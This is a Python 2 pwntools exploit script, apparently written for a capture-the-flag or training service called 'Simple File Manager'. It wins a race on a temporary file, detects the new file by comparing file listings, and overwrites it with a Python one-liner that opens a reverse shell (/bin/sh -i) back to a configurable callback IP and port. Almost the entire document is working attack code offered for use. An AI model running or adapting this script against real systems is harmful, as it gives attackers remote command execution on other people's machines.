#!/usr/bin/env python2

from pwn import *
import sys
from os.path import basename
from threading import Thread
import time
import argparse


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description='temp_files exploit')
    parser.add_argument('-t', '--target', action='store', dest='target', required=False, default='127.0.0.1',
                        help='IP hosting the vulnerable service')
    parser.add_argument('-p', '--port', action='store', dest='port', required=False, default=31337,
                        help='IP to send the reverse shell to')
    parser.add_argument('-c', '--callback-port', action='store', dest='callback_port', required=False, default=4444, type=int,
                        help='The port to get a callback on')
    parser.add_argument('-r', '--reverse-shell-ip', action='store', dest='callback_ip', required=False, default='127.0.0.1',
                        help='IP to send the reverse shell to')
    return parser.parse_args()


def generate_version(target, port):
    ## Generate the version() file
    connection2 = remote(target, port)
    connection2.sendline("mytempdir")
    connection2.recvuntil('Enter your choice:')
    # Send 3 to write the version() command to a file
    print "Creating version() file"
    connection2.send('3')
    connection2.close()


def main():
    args = parse_args(sys.argv)

    print 'This exploit will send a shell to {} on port {}\n' \
          'If this is not what you want, use the options to '\
          'change it (-h will show you the way)'.format(args.callback_ip, args.callback_port)

    ## Get the current list of temp files
    # Connect to the socket and select a temp directory
    connection = remote(args.target, args.port)
    connection.sendline("mytempdir")
    # Get the intro text
    connection.recvuntil('Enter your choice:')
    print "Getting initial file list"
    connection.send('2')
    initial_file_list = connection.recvuntil('Simple File Manager').split('\n')[:-1]
    initial_file_list[0] = initial_file_list[0].strip() # a space is captured before the first element
    connection.close()

    # Generate the version file
    time.sleep(2)
    Thread(target=generate_version, args=(args.target, args.port)).start()
    time.sleep(2)

    ## Get the version() file name
    connection3 = remote(args.target, args.port)
    connection3.sendline("mytempdir")
    connection3.recvuntil('Enter your choice:')
    print 'Getting new file list'
    connection3.send('2')
    new_file_list = connection3.recvuntil('Simple File Manager').split('\n')[:-1]
    new_file_list[0] = new_file_list[0].strip() # a space is captured before the first element
    connection3.close()

    ## Find the temp file to exploit
    tmp_file_list = set(initial_file_list) ^ set(new_file_list)
    if len(tmp_file_list) != 1:
        print 'Could not find a temp file to exploit!'
        print initial_file_list
        print new_file_list
        print '\nTry running the exploit again\n'
        sys.exit(1)
    exploit_file = basename(list(tmp_file_list)[0])
    print 'Will write the exploit to {}'.format(exploit_file)

    ## Write our exploit
    connection4 = remote(args.target, args.port)
    connection4.sendline("mytempdir")
    connection4.recvuntil('Enter your choice:')
    connection4.send('1')
    connection4.recvuntil('Enter the file name:')
    connection4.send(exploit_file)
    connection4.recvuntil('Enter the file contents:')
    print 'Writing exploit to {}'.format(exploit_file)
    connection4.send("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(args.callback_ip, args.callback_port))
    connection4.close()


if __name__ == '__main__':
    main()
